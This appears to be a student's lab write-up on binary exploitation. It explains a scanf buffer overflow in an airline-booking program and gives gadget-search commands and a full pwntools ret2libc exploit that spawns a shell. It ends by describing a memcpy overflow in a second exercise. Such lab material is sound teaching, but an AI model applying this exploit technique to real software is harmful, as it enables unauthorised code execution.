# Laborator 3

### [Q1]: Where are these hundreds of functions?
### Solution to [Q1]:
The functions are here: `/usr/lib/x86_64-linux-gnu/libc.so.6` and the dynamic linker loads these functions into my program's virtual memory. If ASLR is enabled the address of the libc will vary between runs.

## Exercise 1

### [Q2]: Explore the program. What does it do? Where is the vulnerability?
### Solution to [Q2]:
The program checks if a passenger is booked on a specific airline.  The vulnerability lies in the buffer overflow risk when reading the `char name[64];` input in `check_booking()`. The `scanf("%s", name)` call does not limit input length, allowing users to overflow the `name` buffer.

### [Q3]: How does ret2libc fit into this? What are some nice libc functions for exploitation?
### Solution to [Q3]:
We can overwrite the return address to a libc function like `system()` or `exit()`.passing a crafted argument (`/bin/sh`).

### [Q4]: Can we get a shell with this program? How?
### Solution to [Q4]:
We pass the `system()` function the `/bin/sh` argument.

## Solution to Exercise 1: 
Find address of `pop rdi; ret` gadget:
```c
ropper --file ./bin/ex1 --search "pop rdi"
```

Find address of `/bin/sh`:
```c
pwndbg> search -t string "/bin/sh"
Searching for string: b'/bin/sh\x00'
libc.so.6       0x7ffff7f7042f 0x68732f6e69622f /* '/bin/sh' */
```

Find address of `ret` gadget:
```c
ropper --file ./bin/ex1 --search "ret"
```

Find address of `system()`:
```c
pwndbg> p system
$1 = {int (const char *)} 0x7ffff7dfd740 <__libc_system>
```

```python
#!/usr/bin/env python3
from pwn import *

p = process('./bin/ex1')

p.recvuntil('Select an airline:\n')
p.sendline('0')
p.recvuntil('Please input your name to check your booking:\n')

libc_base = 0x00007ffff7da5000
pop_rdi = libc_base + 0x10f75b
system = libc_base + 0x58740
binsh = libc_base + 0x1cb42f

ret = libc_base + 0x2882f

padding = 344

payload = b'A' * padding + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system)

p.sendline(payload)
p.interactive()
```

## Exercise 2
### [Q5]: Explore the program. What does it do? Where is the vulnerability?
### Solution to [Q5]:
The program reads user input into a 256-byte buffer `souldream`, then copies it into a smaller 64-byte buffer `bad_nightmare` using `memcpy` without proper bounds checking. This causes a buffer overflow in the `nightmare()` function because it copies 256 bytes into a buffer that can only hold 64 bytes.